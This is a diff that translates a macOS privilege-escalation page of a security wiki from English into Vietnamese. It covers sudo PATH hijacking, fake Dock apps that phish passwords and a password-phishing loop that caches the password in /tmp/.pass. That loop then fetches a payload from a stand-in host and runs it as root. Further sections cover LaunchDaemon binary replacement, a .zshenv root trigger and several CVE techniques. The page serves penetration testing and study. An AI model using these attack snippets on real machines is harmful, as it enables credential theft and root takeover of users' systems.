@@ -1,10 +1,10 @@
-# macOS Privilege Escalation
+# Leo thang đặc quyền macOS
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TCC Privilege Escalation
+## Leo thang đặc quyền TCC
 
-If you came here looking for TCC privilege escalation go to:
+Nếu bạn đến đây để tìm hiểu về leo thang đặc quyền TCC, hãy xem:
 
 
 {{#ref}}
@@ -13,20 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Many privilege-escalation techniques that affect Linux or other Unix-like systems also apply to macOS. See:
+Nhiều kỹ thuật leo thang đặc quyền ảnh hưởng đến Linux hoặc các hệ thống tương tự Unix cũng áp dụng cho macOS. Xem:
 
 
 {{#ref}}
 ../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
 {{#endref}}
 
-## User Interaction
+## Tương tác với người dùng
 
 ### Sudo Hijacking
 
-You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
+Bạn có thể tìm thấy [kỹ thuật Sudo Hijacking gốc trong bài viết Leo thang đặc quyền Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
 
-However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**
+Tuy nhiên, macOS **giữ nguyên** **`PATH`** của người dùng khi họ chạy **`sudo`**. Điều đó có nghĩa là một cách khác để thực hiện cuộc tấn công này là **chiếm quyền các binary khác** mà nạn nhân vẫn chạy khi **dùng sudo:**
 
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
@@ -43,20 +43,20 @@ chmod +x /opt/homebrew/bin/ls
 sudo ls
 ```
 
-Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
+Lưu ý rằng người dùng sử dụng terminal rất có thể đã **cài Homebrew**. Vì vậy, có thể chiếm quyền các binary trong **`/opt/homebrew/bin`**.
 
-### Dock Impersonation
+### Giả mạo Dock
 
-Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:
+Bằng cách sử dụng một số thủ thuật **social engineering**, bạn có thể **giả mạo**, chẳng hạn như Google Chrome, trong Dock và thực thi script của riêng mình:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-Some suggestions:
+Một số gợi ý:
 
-- Check in the Dock if there is a Chrome, and in that case **remove** that entry and **add** the **fake** **Chrome entry in the same position** in the Dock array.
+- Kiểm tra Dock xem có Chrome hay không. Nếu có, hãy **xóa** mục đó rồi **thêm** mục Chrome **giả mạo** vào cùng vị trí trong mảng Dock.
 
 <details>
-<summary>Chrome Dock impersonation script</summary>
+<summary>Script giả mạo Chrome trong Dock</summary>
 
 ```bash
 #!/bin/sh
@@ -133,13 +133,13 @@ killall Dock
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-Some suggestions:
+Một số gợi ý:
 
-- You **cannot remove Finder from the Dock**, so if you are going to add it to the Dock, you could put the fake Finder just next to the real one. For this you need to **add the fake Finder entry at the beginning of the Dock array**.
-- Another option is to not place it in the Dock and just open it, "Finder asking to control Finder" is not that weird.
-- Another options to **escalate to root without asking** the password with a horrible box, is make Finder really ask for the password to perform a privileged action:
-  - Ask Finder to copy to **`/etc/pam.d`** a new **`sudo`** file (The prompt asking for the password will indicate that "Finder wants to copy sudo")
-  - Ask Finder to copy a new **Authorization Plugin** (You could control the file name so the prompt asking for the password will indicate that "Finder wants to copy Finder.bundle")
+- Bạn **không thể xóa Finder khỏi Dock**, vì vậy nếu định thêm nó vào Dock, bạn có thể đặt Finder giả ngay cạnh Finder thật. Để làm vậy, bạn cần **thêm mục Finder giả vào đầu mảng Dock**.
+- Một lựa chọn khác là không đặt nó trong Dock mà chỉ mở nó; việc “Finder yêu cầu điều khiển Finder” cũng không quá kỳ lạ.
+- Một lựa chọn khác để **leo thang lên root mà không hỏi** mật khẩu bằng một hộp thoại đáng sợ là khiến Finder thực sự yêu cầu mật khẩu để thực hiện một hành động cần quyền đặc biệt:
+  - Yêu cầu Finder sao chép một tệp **`sudo`** mới vào **`/etc/pam.d`** (Lời nhắc yêu cầu mật khẩu sẽ cho biết “Finder muốn sao chép sudo”)
+  - Yêu cầu Finder sao chép một **Authorization Plugin** mới (Bạn có thể kiểm soát tên tệp để lời nhắc yêu cầu mật khẩu sẽ cho biết “Finder muốn sao chép Finder.bundle”)
 
 <details>
 <summary>Finder Dock impersonation script</summary>
@@ -219,15 +219,15 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-### Password prompt phishing + sudo reuse
+### Lừa đảo qua lời nhắc mật khẩu + tái sử dụng sudo
 
-Malware frequently abuses user interaction to **capture a sudo-capable password** and reuse it programmatically. A common flow:
+Malware thường lợi dụng tương tác của người dùng để **thu thập mật khẩu có thể dùng với sudo** rồi tái sử dụng bằng chương trình. Một quy trình phổ biến:
 
-1. Identify the logged in user with `whoami`.
-2. **Loop password prompts** until `dscl . -authonly "$user" "$pw"` returns success.
-3. Cache the credential (e.g., `/tmp/.pass`) and drive privileged actions with `sudo -S` (password over stdin).
+1. Xác định người dùng đang đăng nhập bằng `whoami`.
+2. **Lặp lại lời nhắc mật khẩu** cho đến khi `dscl . -authonly "$user" "$pw"` trả về thành công.
+3. Lưu thông tin xác thực vào bộ nhớ đệm (ví dụ: `/tmp/.pass`) và thực hiện các hành động cần quyền cao bằng `sudo -S` (nhập mật khẩu qua stdin).
 
-Example minimal chain:
+Ví dụ về chuỗi lệnh tối giản:
 
 ```bash
 user=$(whoami)
@@ -240,19 +240,19 @@ curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
 
-The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.<sup>[[1]](#references)</sup>
+Mật khẩu bị đánh cắp sau đó có thể được dùng lại để **xóa trạng thái cách ly của Gatekeeper bằng `xattr -c`**, sao chép LaunchDaemons hoặc các tệp đặc quyền khác, và chạy thêm các giai đoạn mà không cần tương tác.<sup>[[1]](#references)</sup>
 
-#### Validating captured passwords through PAM
+#### Xác thực mật khẩu thu thập được thông qua PAM
 
-A native-looking secure-text prompt can collect a candidate account password and validate it in-process through PAM instead of spawning `dscl`, `security`, or `osascript`. The caller starts a PAM transaction with `pam_start`, supplies the candidate through a conversation callback, calls `pam_authenticate`, and closes the transaction with `pam_end`. A failed check can return to the password field; a successful check confirms the password without starting a separate verification process. PAM authentication alone does **not** elevate the caller or authorize privileged operations.<sup>[[9]](#references)[[10]](#references)</sup>
+Một hộp thoại yêu cầu mật khẩu dạng văn bản bảo mật trông như giao diện gốc có thể thu thập mật khẩu tài khoản cần kiểm tra và xác thực ngay trong tiến trình thông qua PAM, thay vì khởi chạy `dscl`, `security` hoặc `osascript`. Ứng dụng gọi bắt đầu một giao dịch PAM bằng `pam_start`, cung cấp mật khẩu cần kiểm tra thông qua callback hội thoại, gọi `pam_authenticate`, rồi kết thúc giao dịch bằng `pam_end`. Nếu kiểm tra thất bại, ứng dụng có thể quay lại trường nhập mật khẩu; nếu thành công, mật khẩu được xác nhận mà không cần khởi chạy một tiến trình xác minh riêng. Chỉ riêng việc xác thực PAM **không** nâng quyền cho ứng dụng gọi hoặc cho phép thực hiện các thao tác đặc quyền.<sup>[[9]](#references)[[10]](#references)</sup>
 
-If the login and Keychain passwords match, the captured password may also be usable for operations that require the current Keychain password; see [Keychain ACL and partition-list constraints](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>
+Nếu mật khẩu đăng nhập trùng với mật khẩu Keychain, mật khẩu thu thập được cũng có thể dùng cho các thao tác yêu cầu mật khẩu Keychain hiện tại; xem [các ràng buộc về ACL và danh sách phân vùng của Keychain](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>
 
-## Newer macOS-specific vectors (2023–2026)
+## Các vector đặc thù của macOS phiên bản mới hơn (2023–2026)
 
-### Deprecated `AuthorizationExecuteWithPrivileges` still usable
+### `AuthorizationExecuteWithPrivileges` đã lỗi thời nhưng vẫn dùng được
 
-`AuthorizationExecuteWithPrivileges` was deprecated in 10.7 but **still works on Sonoma/Sequoia**. Many commercial updaters invoke `/usr/libexec/security_authtrampoline` with an untrusted path. If the target binary is user-writable you can plant a trojan and ride the legitimate prompt:
+`AuthorizationExecuteWithPrivileges` đã bị đánh dấu lỗi thời từ phiên bản 10.7 nhưng **vẫn hoạt động trên Sonoma/Sequoia**. Nhiều trình cập nhật thương mại gọi `/usr/libexec/security_authtrampoline` với một đường dẫn không đáng tin cậy. Nếu người dùng có thể ghi vào tệp nhị phân đích, bạn có thể cài trojan và lợi dụng lời nhắc hợp lệ:
 
 ```bash
 # find vulnerable helper calls
@@ -264,14 +264,13 @@ chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
 
-Combine with the **masquerading tricks above** to present a believable password dialog.
+Kết hợp với **các thủ thuật giả mạo ở trên** để hiển thị một hộp thoại mật khẩu đáng tin.
 
+### Phân loại nhanh helper có đặc quyền / XPC
 
-### Privileged helper / XPC triage
+Nhiều lỗi macOS privesc của bên thứ ba hiện đại theo cùng một mô hình: một **LaunchDaemon chạy với quyền root** cung cấp **dịch vụ Mach/XPC** từ **`/Library/PrivilegedHelperTools`**, sau đó helper không xác thực client, xác thực **quá muộn** (race PID), hoặc cung cấp một **phương thức root** xử lý **đường dẫn/script do người dùng kiểm soát**. Đây là loại lỗi đứng sau nhiều lỗi helper gần đây trong các client VPN, game launcher và trình cập nhật.<sup>[[2]](#references)</sup>
 
-A lot of modern third-party macOS privescs follow the same pattern: a **root LaunchDaemon** exposes a **Mach/XPC service** from **`/Library/PrivilegedHelperTools`**, then the helper either **doesn't validate the client**, validates it **too late** (PID race), or exposes a **root method** that consumes a **user-controlled path/script**. This is the bug class behind many recent helper bugs in VPN clients, game launchers and updaters.<sup>[[2]](#references)</sup>
-
-Quick triage checklist:
+Danh sách kiểm tra phân loại nhanh:
 
 ```bash
 ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
@@ -283,19 +282,19 @@ for f in /Library/PrivilegedHelperTools/*; do
 done
 ```
 
-Pay special attention to helpers that:
+Đặc biệt chú ý đến các helper:
 
-- keep accepting requests **after uninstall** because the job stayed loaded in `launchd`
-- execute scripts or read configuration from **`/Applications/...`** or other paths writable by non-root users
-- rely on **PID-based** or **bundle-id-only** peer validation that may be raceable
+- vẫn tiếp tục chấp nhận yêu cầu **sau khi gỡ cài đặt** vì job vẫn được tải trong `launchd`
+- thực thi script hoặc đọc cấu hình từ **`/Applications/...`** hay các đường dẫn khác mà người dùng không phải root có thể ghi
+- dựa vào việc xác thực peer **chỉ bằng PID** hoặc **chỉ bằng bundle-id**, vốn có thể bị khai thác race condition
 
-For more details on helper authorization bugs check [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).
+Để biết thêm chi tiết về các lỗi authorization của helper, hãy xem [trang này](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).
 
-### PackageKit script environment inheritance (CVE-2024-27822)
+### Kế thừa môi trường script của PackageKit (CVE-2024-27822)
 
-Until Apple fixed it in **Sonoma 14.5**, **Ventura 13.6.7** and **Monterey 12.7.5**, user-initiated installs via **`Installer.app`** / **`PackageKit.framework`** could execute **PKG scripts as root inside the current user's environment**. That means a package using **`#!/bin/zsh`** would load the attacker's **`~/.zshenv`** and run it as **root** when the victim installed the package.<sup>[[3]](#references)</sup>
+Trước khi Apple khắc phục lỗi này trong **Sonoma 14.5**, **Ventura 13.6.7** và **Monterey 12.7.5**, các lần cài đặt do người dùng khởi chạy thông qua **`Installer.app`** / **`PackageKit.framework`** có thể thực thi **script PKG với quyền root trong môi trường của người dùng hiện tại**. Điều đó có nghĩa là một package sử dụng **`#!/bin/zsh`** sẽ tải **`~/.zshenv`** của attacker và chạy tệp đó với quyền **root** khi victim cài đặt package.<sup>[[3]](#references)</sup>
 
-This is especially interesting as a **logic bomb**: you only need a foothold in the user's account and a writable shell startup file, then you wait for any vulnerable **zsh-based** installer to be executed by the user. This does **not** generally apply to **MDM/Munki** deployments because those run inside the root user's environment.<sup>[[3]](#references)</sup>
+Điều này đặc biệt đáng chú ý dưới dạng **logic bomb**: bạn chỉ cần foothold trong tài khoản người dùng cùng một tệp khởi động shell có thể ghi, sau đó chờ người dùng chạy bất kỳ trình cài đặt nào dựa trên **zsh** có lỗ hổng. Điều này nhìn chung **không** áp dụng cho các đợt triển khai **MDM/Munki**, vì chúng chạy trong môi trường của người dùng root.<sup>[[3]](#references)</sup>
 
 ```bash
 # inspect a vendor pkg for shell-based install scripts
@@ -307,20 +306,20 @@ rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
 echo 'id > /tmp/pkg-root' >> ~/.zshenv
 ```
 
-If you want a deeper dive into installer-specific abuse, also check [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).
+Nếu muốn tìm hiểu sâu hơn về việc lạm dụng installer, hãy xem thêm [trang này](macos-files-folders-and-binaries/macos-installers-abuse.md).
 
-### Installer destination collision via `.localized`
+### Va chạm đích của Installer qua `.localized`
 
-Some third-party installers register a root LaunchDaemon whose executable is referenced with a fixed path inside `/Applications/Target.app`. If an attacker can create that bundle first with a **different bundle identifier**, Installer may preserve the decoy and place the real app at `/Applications/Target.localized/Target.app`. The daemon still points to the original path. Therefore, an attacker-controlled executable inside the decoy bundle can later run as root.<sup>[[8]](#references)</sup>
+Một số installer bên thứ ba đăng ký LaunchDaemon cấp root, với executable được tham chiếu bằng một đường dẫn cố định bên trong `/Applications/Target.app`. Nếu kẻ tấn công có thể tạo bundle đó trước bằng **một bundle identifier khác**, Installer có thể giữ lại bundle mồi nhử và đặt ứng dụng thật tại `/Applications/Target.localized/Target.app`. Daemon vẫn trỏ đến đường dẫn ban đầu. Vì vậy, executable do kẻ tấn công kiểm soát bên trong bundle mồi nhử có thể chạy với quyền root sau đó.<sup>[[8]](#references)</sup>
 
-The important preconditions are:<sup>[[8]](#references)</sup>
+Các điều kiện tiên quyết quan trọng là:<sup>[[8]](#references)</sup>
 
-1. The attacker can create or control the expected application path.
-2. The package does not remove the conflicting bundle.
-3. The privileged job uses a hard-coded path inside that bundle.
-4. The user or an MDM workflow installs the package and registers the job.
+1. Kẻ tấn công có thể tạo hoặc kiểm soát đường dẫn ứng dụng dự kiến.
+2. Package không xóa bundle xung đột.
+3. Job có đặc quyền sử dụng đường dẫn hard-code bên trong bundle đó.
+4. Người dùng hoặc quy trình MDM cài đặt package và đăng ký job.
 
-Look for relocated bundles and then review LaunchDaemon targets with the enumeration loop in the next section:<sup>[[8]](#references)</sup>
+Tìm các bundle đã được di chuyển, sau đó kiểm tra các đích LaunchDaemon bằng vòng lặp liệt kê ở phần tiếp theo:<sup>[[8]](#references)</sup>
 
 ```bash
 find /Applications -type d -name '*.localized' -prune -print
@@ -329,13 +328,13 @@ for app in /Applications/*.app; do
 done
 ```
 
-A safer installer resolves the final bundle location and keeps privileged executables in a root-owned location such as `/Library/PrivilegedHelperTools`. It should also verify ownership and code signing before registering or starting the job.<sup>[[8]](#references)</sup>
+Một installer an toàn hơn sẽ xác định vị trí bundle cuối cùng và đặt các executable có đặc quyền tại vị trí do root sở hữu, chẳng hạn như `/Library/PrivilegedHelperTools`. Installer cũng nên xác minh quyền sở hữu và chữ ký mã trước khi đăng ký hoặc khởi chạy job.<sup>[[8]](#references)</sup>
 
-### Writable LaunchDaemon target hijack
+### Hijack mục tiêu LaunchDaemon có thể ghi
 
-A LaunchDaemon plist may be root-owned while its `Program` or first `ProgramArguments` entry points into a user-writable directory. Check the **whole path**, not only the executable mode. If the parent directory is writable, an attacker may rename a root-owned executable and create a replacement at the same path. The replacement runs as root the next time the job starts. A reboot or a normal service restart is enough. The attacker does not need permission to run `launchctl bootstrap` in the system domain.<sup>[[7]](#references)</sup>
+Một plist của LaunchDaemon có thể do root sở hữu, nhưng `Program` hoặc mục đầu tiên trong `ProgramArguments` lại trỏ đến một thư mục mà người dùng có quyền ghi. Hãy kiểm tra **toàn bộ đường dẫn**, không chỉ quyền của executable. Nếu thư mục cha có quyền ghi, kẻ tấn công có thể đổi tên executable do root sở hữu rồi tạo một bản thay thế tại cùng đường dẫn. Bản thay thế sẽ chạy với quyền root khi job khởi chạy lần tiếp theo. Chỉ cần khởi động lại hoặc khởi động lại dịch vụ như bình thường. Kẻ tấn công không cần quyền chạy `launchctl bootstrap` trong system domain.<sup>[[7]](#references)</sup>
 
-Enumerate each target and its immediate parent first:<sup>[[7]](#references)</sup>
+Trước tiên, liệt kê từng mục tiêu và thư mục cha trực tiếp của nó:<sup>[[7]](#references)</sup>
 
 ```bash
 for p in /Library/LaunchDaemons/*.plist; do
@@ -348,7 +347,7 @@ for p in /Library/LaunchDaemons/*.plist; do
 done
 ```
 
-When the file or its parent is writable, preserve the original binary and replace the path with an executable payload. Then wait for the already-loaded daemon to restart.<sup>[[7]](#references)</sup>
+Khi tệp hoặc thư mục cha có quyền ghi, giữ lại binary gốc rồi thay đường dẫn bằng một payload thực thi. Sau đó chờ daemon đã được tải sẵn khởi động lại.<sup>[[7]](#references)</sup>
 
 ```bash
 target=/path/from/the/plist
@@ -357,9 +356,9 @@ cp /tmp/payload "$target"
 chmod 755 "$target"
 ```
 
-### XNU SMR credential-pointer race (CVE-2025-24118)
+### XNU SMR race con trỏ credential (CVE-2025-24118)
 
-The vulnerable `kauth_cred_proc_update` path updated `proc_ro.p_ucred` with the non-atomic `zalloc_ro_mut` API while SMR readers loaded the pointer without a lock. The public trigger uses a specially prepared setgid binary. One thread switches between its real and effective group IDs while another thread repeatedly enters a syscall such as `getgid()`.<sup>[[4]](#references)</sup>
+Đường dẫn dễ bị tấn công `kauth_cred_proc_update` cập nhật `proc_ro.p_ucred` bằng API không nguyên tử `zalloc_ro_mut`, trong khi các trình đọc SMR tải con trỏ mà không khóa. Cách kích hoạt công khai sử dụng một binary setgid được chuẩn bị đặc biệt. Một thread chuyển đổi giữa group ID thực và hiệu lực của nó, trong khi một thread khác liên tục gọi syscall như `getgid()`.<sup>[[4]](#references)</sup>
 
 ```c
 // Writer thread inside a setgid binary
@@ -371,35 +370,35 @@ while (1) {
 while (1) observed_gid = getgid();
 ```
 
-Treat this as a **race primitive**, not a ready-made root exploit. The published PoC demonstrates a torn credential pointer. It commonly ends in a kernel panic. The researcher only reproduced the corruption on Intel and did not provide deterministic control of the resulting credential object. Apple changed the update to an atomic pointer exchange in macOS 15.3.<sup>[[4]](#references)</sup>
+Coi đây là một **primitive cho race condition**, không phải exploit root hoàn chỉnh. PoC được công bố cho thấy một con trỏ credential bị xé. Lỗi này thường gây kernel panic. Nhà nghiên cứu chỉ tái hiện được tình trạng hỏng dữ liệu trên Intel và không chứng minh được khả năng kiểm soát có tính xác định đối với đối tượng credential phát sinh. Apple đã thay đổi thao tác cập nhật thành trao đổi con trỏ nguyên tử trong macOS 15.3.<sup>[[4]](#references)</sup>
 
-### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)
+### Vượt qua SIP qua Migration Assistant ("Migraine", CVE-2023-32369)
 
-If you already have root, SIP still blocks writes to system locations. The **Migraine** bug abuses the Migration Assistant entitlement `com.apple.rootless.install.heritable` to spawn a child process that inherits SIP bypass and overwrites protected paths (e.g., `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> The chain:
+Ngay cả khi đã có root, SIP vẫn chặn việc ghi vào các vị trí hệ thống. Lỗi **Migraine** lợi dụng entitlement của Migration Assistant `com.apple.rootless.install.heritable` để tạo một tiến trình con kế thừa khả năng vượt qua SIP và ghi đè các đường dẫn được bảo vệ (ví dụ: `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Chuỗi khai thác:
 
-1. Obtain root on a live system.
-2. Trigger `systemmigrationd` with crafted state to run an attacker-controlled binary.
-3. Use inherited entitlement to patch SIP-protected files, persisting even after reboot.
+1. Có được root trên hệ thống đang hoạt động.
+2. Kích hoạt `systemmigrationd` bằng trạng thái được tạo thủ công để chạy một binary do kẻ tấn công kiểm soát.
+3. Dùng entitlement được kế thừa để vá các tệp được SIP bảo vệ; thay đổi vẫn tồn tại sau khi khởi động lại.
 
-### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
+### Lén đưa biểu thức NSPredicate/XPC vào (nhóm lỗi CVE-2023-23530/23531)
 
-Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate the `expressionType` field, which is attacker-controlled. By crafting a predicate that evaluates arbitrary selectors you can achieve **code execution in root/system XPC services** (e.g., `coreduetd`, `contextstored`). When combined with an initial app sandbox escape, this grants **privilege escalation without user prompts**. Look for XPC endpoints that deserialize predicates and lack a robust visitor.<sup>[[6]](#references)</sup>
+Nhiều daemon của Apple chấp nhận đối tượng **NSPredicate** qua XPC nhưng chỉ xác thực trường `expressionType`, vốn do kẻ tấn công kiểm soát. Bằng cách tạo predicate thực thi các selector tùy ý, bạn có thể đạt được **thực thi mã trong các dịch vụ XPC root/system** (ví dụ: `coreduetd`, `contextstored`). Khi kết hợp với việc thoát khỏi sandbox của ứng dụng ban đầu, điều này cho phép **leo thang đặc quyền mà không cần lời nhắc người dùng**. Hãy tìm các endpoint XPC giải tuần tự predicate nhưng không có visitor đủ mạnh.<sup>[[6]](#references)</sup>
 
-## TCC - Root Privilege Escalation
+## TCC - Leo thang đặc quyền root
 
-### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+### CVE-2020-9771 - Vượt qua TCC và leo thang đặc quyền qua mount_apfs
 
-**Any user** (even unprivileged ones) can create and mount a Time Machine snapshot with `-o noowners` and **access ALL the files** of that snapshot, bypassing the ownership checks on the live volume. The only privilege needed is for the application used (like `Terminal`) to have **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).
+**Bất kỳ người dùng nào** (kể cả người dùng không có đặc quyền) đều có thể tạo và mount snapshot Time Machine bằng `-o noowners` rồi **truy cập TẤT CẢ các tệp** trong snapshot đó, qua mặt các bước kiểm tra quyền sở hữu trên volume đang hoạt động. Đặc quyền duy nhất cần có là ứng dụng được sử dụng (chẳng hạn như `Terminal`) phải có **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).
 
-The commands and the full explanation are in the TCC bypasses page:
+Các lệnh và phần giải thích đầy đủ có trên trang TCC bypasses:
 
 {{#ref}}
 macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
 {{#endref}}
 
-## Sensitive Information
+## Thông tin nhạy cảm
 
-This can be useful to escalate privileges:
+Thông tin này có thể hữu ích khi leo thang đặc quyền:
 
 
 {{#ref}}
@@ -412,13 +411,13 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 ## References
 
-- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
-- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
-- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
+- [1] [Pentest Partners - 2025, năm của Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [2] [CVE-2024-30165: Leo thang đặc quyền cục bộ qua AWS Client VPN cho macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
+- [3] [CVE-2024-27822: Leo thang đặc quyền qua macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
 - [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
-- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
-- [7] [LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
-- [8] [macOS LPE via the .localized directory](https://theevilbit.github.io/posts/localized/)
-- [9] [Jamf Threat Labs - PamStealer: macOS malware posing as clipboard manager app](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
-- [10] [Kaspersky Securelist - MacSync under the microscope](https://securelist.com/macsync-new-version/121383/)
+- [5] [Microsoft "Migraine" - Vượt qua SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [6] [Trung tâm Nghiên cứu Tiên tiến Trellix - Một nhóm lỗi leo thang đặc quyền mới trên macOS và iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
+- [7] [Chiếm quyền LaunchDaemon: leo thang đặc quyền và duy trì quyền truy cập qua quyền thư mục không an toàn](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
+- [8] [LPE trên macOS qua thư mục .localized](https://theevilbit.github.io/posts/localized/)
+- [9] [Jamf Threat Labs - PamStealer: malware macOS giả dạng ứng dụng quản lý clipboard](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
+- [10] [Kaspersky Securelist - Phân tích chi tiết MacSync](https://securelist.com/macsync-new-version/121383/)
